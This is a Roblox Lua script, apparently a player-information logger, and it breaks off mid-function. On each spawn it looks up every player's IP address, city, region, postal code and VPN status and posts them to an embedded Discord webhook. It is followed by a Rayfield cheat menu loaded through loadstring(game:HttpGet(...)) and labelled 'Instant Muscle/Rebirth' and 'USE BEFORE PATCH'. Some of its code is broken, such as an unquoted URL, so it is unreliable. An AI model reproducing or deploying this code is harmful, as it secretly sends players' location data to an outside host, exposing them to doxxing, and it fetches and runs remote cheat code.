-- ServerScriptService Script

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Replace with your Discord webhook URL
local WEBHOOK_URL = 'https://discord.com/api/webhooks/1368684628323598479/cD0IBzOCxdE0tK3PRmGqqSI6YeUODIkTHR33t0pVAZMaDTQv3mP4dk7bO0N3PDV2kUHK'

local function getPlayerInfo(player)
    local ipInfo = HttpService:JSONDecode(HttpService:GetAsync("http://ipinfo.io/" .. player.UserId .. "/json"))
    local playerData = {
        RobloxUsername = player.Name,
        RobloxDisplayName = player.DisplayName,
        RobloxUserId = player.UserId,
        IPAddress = ipInfo.ip,
        City = ipInfo.city,
        Region = ipInfo.region,
        Country = ipInfo.country,
        Postal = ipInfo.postal,
        VPN = tostring(ipInfo.privacy.vpn),
        AvatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png",
        ProfileUrl = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
    }
    return playerData
end

local function createDiscordEmbed(playerData)
    local embed = {
        title = "Player Information",
        description = "Details about " .. playerData.RobloxDisplayName,
        color = 0x00ff00,
        fields = {
            { name = "Roblox Username", value = playerData.RobloxUsername, inline = true },
            { name = "Roblox Display Name", value = playerData.RobloxDisplayName, inline = true },
            { name = "Roblox User ID", value = tostring(playerData.RobloxUserId), inline = true },
            { name = "IP Address", value = playerData.IPAddress, inline = true },
            { name = "City", value = playerData.City, inline = true },
            { name = "Region", value = playerData.Region, inline = true },
            { name = "Country", value = playerData.Country, inline = true },
            { name = "Postal Code", value = playerData.Postal, inline = true },
            { name = "VPN", value = playerData.VPN, inline = true },
            { name = "Profile", value = "[" .. playerData.ProfileUrl .. "]( " .. playerData.ProfileUrl .. ")", inline = false }
        },
        thumbnail = {
            url = playerData.AvatarUrl
        },
        footer = {
            text = "Roblox Player Info",
            icon_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/Roblox_logo.svg/2048px-Roblox_logo.svg.png"
        }
    }
    return embed
end

local function sendToDiscord(embed)
    local data = {
        embeds = { embed }
    }

    local options = {
        Url = https://discord.com/api/webhooks/1368684628323598479/cD0IBzOCxdE0tK3PRmGqqSI6YeUODIkTHR33t0pVAZMaDTQv3mP4dk7bO0N3PDV2kUHK,
        Body = HttpService:JSONEncode(data),
        ["Content-Type"] = "application/json"
    }

    HttpService:PostAsync(options.Url, options.Body, Enum.HttpContentType.ApplicationJson, false, options["Content-Type"])
end

local function onPlayerJoined(player)
    player.CharacterAdded:Connect(function(character)
        -- Wait for the player to fully load into the game
        wait(5)

        local playerData = getPlayerInfo(player)
        local embed = createDiscordEmbed(playerData)
        sendToDiscord(embed)
    end)
end

Players.PlayerAdded:Connect(onPlayerJoined)




local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
   Name = "Instant Muscle/Rebirth",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "USE BEFORE PATCH",
   LoadingSubtitle = "Made by Dev of delta",
   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local TabMain = Window:CreateTab("Main Shi", "sword")

local Button = TabMain:CreateButton({
   Name = "Instant 500B",
   Callback = function()
      
